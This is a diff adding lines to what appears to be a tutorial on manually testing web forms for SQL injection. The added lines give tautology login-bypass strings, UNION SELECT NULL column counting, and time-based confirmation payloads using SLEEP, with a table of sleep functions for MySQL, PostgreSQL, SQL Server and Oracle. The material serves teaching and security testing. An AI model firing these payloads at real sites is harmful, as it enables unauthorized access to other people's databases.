@@ -159,7 +159,13 @@ To test for SQL injection add the following as a value to a input field on a for
 ' OR '1'='1' --
 ```
 
-This should look familiar as it was used above when talking about manually checking for SQL injection. If the login succeeds or an error message appears this likely means there is a SQL injection vulnerability.
+or
+
+```sql
+' OR 'a'='a' --
+```
+
+These should look familiar as one was used above when talking about manually checking for SQL injection. If the login succeeds or an error message appears this likely means there is a SQL injection vulnerability.
 
 ##### Find the number of columns
 
@@ -171,7 +177,36 @@ To test for the number of columns I'll add an order by statement. I'll keep addi
 ' ORDER BY 3 --        # keep going until error
 ```
 
+or
+
+```sql
+' UNION SELECT NULL --  
+' UNION SELECT NULL, NULL --  
+' UNION SELECT NULL, NULL, NULL --  
+```
+
 ##### Confirm injection with time based attack
+
+Now that I know the column count, I can add the SLEEP command as part of a union select statement. If there is a delay, then the injection has been confirmed.
+
+```sql
+' UNION SELECT SLEEP(5), NULL--  
+```
+
+or
+
+```sql
+' OR IF(1=1, SLEEP(5), 0)--  
+```
+
+**NOTE**: not all database management systems (DBMS) have the same SLEEP function. For example, PostgreSQL uses `pg_sleep`. If SLEEP doesn't work I'll try out other ones. Here is a table of the different ones:
+
+| DBMS | Sleep Function |
+| --- | --- |
+| MySQL | SLEEP |
+| PostgreSQL | pg_sleep |
+| SQL Server | WAITFOR DELAY |
+| Oracle | DBMS_SESSION.SLEEP |
 
 ### Security Measures
 
